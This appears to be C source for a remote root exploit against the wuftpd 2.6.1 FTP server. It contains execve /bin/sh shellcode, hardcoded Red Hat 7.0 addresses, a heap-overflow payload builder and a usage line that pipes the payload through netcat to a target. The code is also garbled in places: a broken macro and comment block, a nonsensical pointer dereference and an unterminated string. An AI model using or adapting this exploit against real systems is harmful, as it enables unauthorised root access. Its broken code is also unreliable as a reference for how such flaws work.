/*
 * wu261.c
 * wuftpd 2.6.1 exploit (remote root)
 *
 * Vulnerability and code from Andrew Plughes.
 *
 * Usage: (./wu261 [address]; cat) | nc host 21
 * address = argument location on heap (defeats Openwall)
 *
 * Demonstrates a flaw in the pre-authentication code of 
 * wuftpd 2.6.x which allows us to gain control of the
 * target process by displacing a saved frame pointer.
 *
 * Tested against some Linux distributions.  
 *
 * I'd like to thank Bill Harrington for providing me 
 * with some test boxes. 
 *  
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
unsigned char linux_x86[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";
unsigned char *shellcode = linux_x86;
//#define POTS 12                       /* fill these in for your
#define DEF_ALGN 1                       * target system  
//#define HEAP_ADDR 0x41414141           */ 
                                      
                        
int main(int argc, char *argv[])
{
        int i;
        unsigned long attack[1028 / 4];
/* redhat 7.0 */
#define ADDR 0x08049588 
#define POSITION_OF_THE_STRING 16
#define target (unsigned long) 
// unsigned long arg_addr = target HEAP_ADDR, align = DEF_ALGN;
        unsigned long arg_addr = ADDR, align = DEF_ALGN,
        pots = POSITION_OF_THE_STRING;
        if(argc == 2) 
        arg_addr = strtoul(argv[1], NULL, 0);
        system("clear");
        fputs("wuftpd 2.6.1 exploit\n", stderr);
        fputs("developed by Andrew Plughes\n", stderr);  
        for(i = 0; i < 1028 / 4; i++) 
        attack[i] = arg_addr;
        /* trigger the cast overflow with this command */
        sprintf((char *)attack, "U aa"); // "aa" -> for "\r\n"
        /* position of the string */
        for(i = 0; i < 4; i++)  
        sprintf((char *)attack+4+i, "%c", (unsigned long)puts >> i * 8 & 0xff);
        /* function var position */
        pots = *(unsigned long *)(attack[1] + 2); // rh7 -> attack+16+2
        /* set the function var accordingly */
        *(unsigned long *)pots = align; 
        /* spaces for the process alignment */
        sprintf((char *)attack+20, "%*s", align % 4, "    "); 
        printf("USER %s\r\n", shellcode);
        printf("%s\r\n", attack);
        puts("echo ~ ok, it seems to have worked... remember: \");
        puts("rm -rf is not elite ~");      
        
        exit(0);
}